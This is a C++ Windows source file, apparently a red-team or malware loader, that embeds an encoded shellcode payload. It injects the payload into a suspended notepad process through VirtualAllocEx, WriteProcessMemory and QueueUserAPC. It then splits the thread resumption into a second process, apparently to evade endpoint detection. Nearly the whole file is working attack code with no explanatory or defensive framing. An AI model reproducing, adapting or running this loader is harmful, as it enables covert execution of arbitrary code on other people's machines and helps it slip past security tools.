// SplitInjection.cpp : 此文件包含 "main" 函数。程序执行将在此处开始并结束。
//

#include <stdio.h>
#include <windows.h>
#include <TlHelp32.h>

char shellcode[] = 
"\x4d\x31\xed\x49\x89\xe6\xdb\xd4\x41\xb5\x7f\x66\x41\x81\xe6"
"\xa0\xf9\x49\x0f\xae\x06\x48\xb8\x9b\x4a\x69\xab\x1a\xa5\xe3"
"\x05\x49\x83\xc6\x08\x49\x8b\x1e\x49\xff\xcd\x4a\x31\x44\xeb"
"\x2d\x4d\x85\xed\x75\xf3\xd6\x7b\x8d\xe3\xa7\x1c\x9f\xb5\xbc"
"\xe4\x0f\xe7\x6e\xf1\xa2\x5d\x40\x85\x0f\xea\x9b\x45\x23\xf3"
"\xd2\x45\xc7\xab\x5b\x11\x9a\x4c\x10\x1a\x61\xe2\xe5\x69\xa9"
"\x34\xf7\xa8\x49\xe6\x9f\x41\x96\xf6\x6b\xbf\x3e\xea\xf5\x42"
"\x48\xb1\xd0\x7f\x61\xc8\x0e\xec\xe6\x6c\xe5\x74\xf5\x55\x55"
"\x8b\x9e\x87\x62\x80\xaa\xc5\xbb\x6d\xa8\x38\xa9\x71\xd1\xc4"
"\x4b\x0d\xe3\x40\x66\xc6\xc4\xc4\x31\x35\xda\x82\xbd\x43\xa2"
"\x88\x98\xe0\xac\x06\x2e\x32\xb2\xdc\xcc\x8b\x22\x6b\x5c\x24"
"\x90\x84\x28\xe7\x6d\xa5\x2f\x83\x58\xc6\xe8\xb0\x80\x10\xed"
"\xff\xfe\x8c\x56\xc8\xa6\x6c\x12\x6a\xc6\x88\x2c\xe0\x98\xae"
"\x6f\xa4\x48\x02\xd9\x75\x56\x6d\xc9\x71\xda\x0b\xf9\x66\x96"
"\x46\x45\x4e\x41\x13\x00\xb3\x36\x75\xd9\xdd\x9c\xe4\x67\x7e"
"\x5c\xb4\x2a\xdc\x6c\x81\x2d\x03\xab\x2d\x3f\xd8\x16\x91\x13"
"\xc1\xc4\x3c\x8b\x81\xac\xd1\x66\xf0\xd9\xcf\xfe\x42\x4c\x03"
"\xea\x73\xe6\xe4\xdc\x3f\xf6\xe6\x77\x5a\xd9\x7b\x14\x3b\x77"
"\x43\x90\xcd\xd9\xff\xf7\x76\x3f\xfc\xe8\xe1\xa1\x28\x43\x53"
"\x3f\x86\xd8\xd8\x63\x78\xb7\xb3\x3e\x47\x1c\x02\xe9\x56\xc7"
"\xc4\x92\x3e\x0c\x92\x0f\x9e\xc3\x45\x3e\x76\xf9\x7e\xf4\x88"
"\x93\x46\x2a\x1c\xb9\x6d\x59\x79\x0d\x38\x7f\x86\x06\x15\x4c"
"\x01\xc2\xb2\x5c\x86\x7c\x2d\x75\xc3\xce\xd1\x6e\x22\xad\x84"
"\x84\x0b\xe0\xa1\x02\x92\x1c\x2d\x15\x5c\x5a\x50\x74\x90\x12"
"\x3c\xde\x33\xc6\x55\xd1\x3f\xe3\x76\x59\xc6\xcb\x6b\xcf\x52"
"\xe4\x90\xa2\x2f\xcf\xd1\xf7\x9f\xc0\x90\xd8\x0f\xf3\x13\x17"
"\x4f\xfe\xe3\x67\x4b\x34\xdc\x39\x47\xfe\xbe\x56\x4f\xb9\xbe"
"\x65\x64\x3a\x0d\x2a\xda\xa3\x79\x50\x68\x5e\x3e\xe2\xb3\x49"
"\x7d\xd4\x83\x13\x77\x5c\xcb\x4a\x00\x3b\x2e\x36\x73\x26\xeb"
"\x70\xc2\x99\x75\x5a\x52\xa1\x79\x91\x29\x94\xc9\x1e\x65\x6d"
"\x68\x47\x61\x09\x30\xf8\xa9\xd6\xe9\x98\x16\x33\xac\x41\x56"
"\x9f\x21\xda\xde\x5b\x97\xb1\x56\x6f\x41\x93\xa6\xa4\x09\x99"
"\x52\x15\x79\xac\x64\xd9\xf8\xe8\x24\xdb\x28\x9c\xbe\xdd\x40"
"\xfd\x03\x2c\xe9\xa4\xe1\x68\x80\x11\xcb\x6e\x20\xfa\xa3\xc6"
"\xa8\xa5\x8d\xd6\xff\x39\x2c\x1f\xaa\x16\x2c\x92\xa6\x0c\x50"
"\xf8\x3d\x34\x28\xe8\x9e\x32\x92\x1f\x12\x9d\x05\x52\x9b\x6d"
"\x69\x17\x7f\x0f\xcc\xf0\x60\xa9\x79\x17\x1a\x9d\x1e\x7d\x9b"
"\xe1\xc4\x1f\x94\xd1\xdc\x36\xea\x99\x9c\x94\x93\x32\x55\x9f"
"\x9b\x2f\xd4\x1f\xaa\x13\x05\xaa\x9b\x55\xc4\x23\x68\x40\x16"
"\x86\xc5\x83\xeb\x02\x32\xff\x42\xa5\xeb\x78\x0b\x36\x2b\x55"
"\x66\x1c\x9b\x69\x23\xea\x4c\x0e\xd7\x50\x6a\x73\x58\xac\x61"
"\xce\x97\x2c\x28\xd5\x22\x1a\x2b\x40\xae\x35\x69\xeb\x22\x60"
"\x2b\x7c\x6c\x4d\x41\xfd\x62\x5d\xc5\x78\x8c\x9a\x28\x6e\xb1"
"\x1b\x9b\x2f\x22\x41\xc6\x20\xed\xdf\xf9\x70\xb5\xe2\x80\xfc"
"\x7f\x13\x31\x33\x7d\x83\xb2\x03\x7b\x97\x85\x78\xcb\xce\x3f"
"\x3a\x72\xef\xbf\x7c\xb1\xf6\x05\xf8\xf8\x05\xa5\xfe\x02\xc4"
"\xde\x38\xca\x05\x7b\x51\x83\xf1\x27\xa5\x42\x29\x77\xb2\x43"
"\xa2\x63\x1d\x71\x84\xb3\xb9\x9d\x03\x23\x96\xe3\x4c\xb2\x49"
"\xfb\x49\x5f\x59\x6d\x53\xb2\x33\xf3\x71\x9d\x0f\x89\x48\x1a"
"\x36\x6a\xf6\x91\x1b\x11\xc9\xfe\xc6\xd4\x58\x2f\xa3\x93\x98"
"\xa8\x8e\xa4\xdb\x0b\xbb\x4a\x9b\x9e\xf8\xdd\x82\x3c\xeb\xff"
"\x81\x75\x94\xb5\x37\x26\x78\xb3\x99\xc0\x8e\x9a\xbe\x24\xb9"
"\x8c\xf8\x37\x8e\xa4\xc9\xc2\xcf\xa0\xb5\xfc\xea\xb5\x48\xaf"
"\x3a\xcc\x88\xff\x07\x77\xe4\x3c\xb2\x90\xf7\xb6\x4d\xc7\x29"
"\x50\x78\x83\xf5\xb6\xc7\x45\x37\xe5\x73\x49\xc9\xfe\xc6\xdd"
"\x8c\xae\x87\xae\x81\xff\x16\xc5\x37\xe5\xbb\xd9\xf7\xba\x4d"
"\xd5\x29\x27\xf2\x11\x2a\xa2\x8e\x6a\xc0\x50\xb2\x4a\xfd\x76"
"\x8e\x94\xdf\x23\xc2\x08\x81\xcf\x06\x39\x48\xaf\x3a\xcc\x88"
"\xff\x07\xad\xe9\x1b\x02\xff\x85\xfd\x8a\xb1\x01\x2b\xca\x10"
"\xbc\x28\x9e\xab\x4d\xe5\xb3\xe5\x80\xff\x16\xf3\x37\x2f\x78"
"\xcd\x81\xc0\x82\x1e\x49\x72\xba\xc0\x19\xc0\x87\x1e\x0d\xe6"
"\xbb\xc0\x19\xbf\x9e\xd4\x51\x30\xaa\x9b\x88\xa6\x87\xcc\x48"
"\x34\xbb\x42\x25\xde\x87\xc7\xf6\x8e\xab\x80\x90\xa4\xf8\xdd"
"\x82\x7c\x1a\x88\x36\x01\x39\xc8\x40\xa9\x32\xc1\xc9\xfe\xc6"
"\xab\x41\xe3\x66\x3f\xc9\xfe\xc6\xab\x45\xe3\x76\xce\xc8\xfe"
"\xc6\xdd\x38\xa7\xb2\x7b\x8c\x7d\x90\x92\xf6\xbb\xbb\xf0\x00"
"\xbf\x7c\x65\xbc\xcc\xa5\x3e\x1c\xb6\xa3\xf9\x65\x01\xdf\xe1"
"\xaf\x8c\xa9\xf8\x29\x23\xa0\x87\xe8\xfe\x8b\xf0\x7a\x1d\x92"
"\xa6\xac\xbc\xa9\xed\x09\x49\x8b\xaf\x98\x6a\x76\x13\x54\xec"
"\xfd\xf2\x52\x75\x4b\x6e\xe3\x9b\xf0\xe3\x14\x5a\x3a\x6c\xc5"
"\xcd\x37\xd5\xcc\x78\x49\x92\xf5\xe7\xaf\x39\x5b\xfa\x41\x35"
"\xe3\x6a";
DWORD FindExplorerPID() {
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 process = { 0 };
    process.dwSize = sizeof(process);

    if (Process32First(snapshot, &process)) {
        do {
            if (!wcscmp(process.szExeFile, L"explorer.exe"))
                break;
        } while (Process32Next(snapshot, &process));
    }

    CloseHandle(snapshot);
    return process.th32ProcessID;
}
int main(int argc, char* argv[]) {

    if (argv[1]==NULL)
    {
        STARTUPINFOA si = { 0 };
        si.cb = sizeof(si);
        PROCESS_INFORMATION pi = { 0 };

        CreateProcessA(NULL, (LPSTR)"notepad", NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
        VirtualAllocEx(pi.hProcess, (PVOID)0x0000480000000000, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        WriteProcessMemory(pi.hProcess, (PVOID)0x0000480000000000, shellcode, sizeof(shellcode), NULL);
        char cmd[MAX_PATH] = {0};
        wsprintfA(cmd, "%s %d", argv[0], pi.dwThreadId);
        QueueUserAPC((PAPCFUNC)0x0000480000000000, pi.hThread, NULL);
        CreateProcessA(NULL, (LPSTR)cmd, NULL, NULL, FALSE, NULL, NULL, NULL, &si, &pi);
    }
    else
    {
        HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, NULL, atoi(argv[1]));
        ResumeThread(hThread);
    }
    
    
    return 0;
}
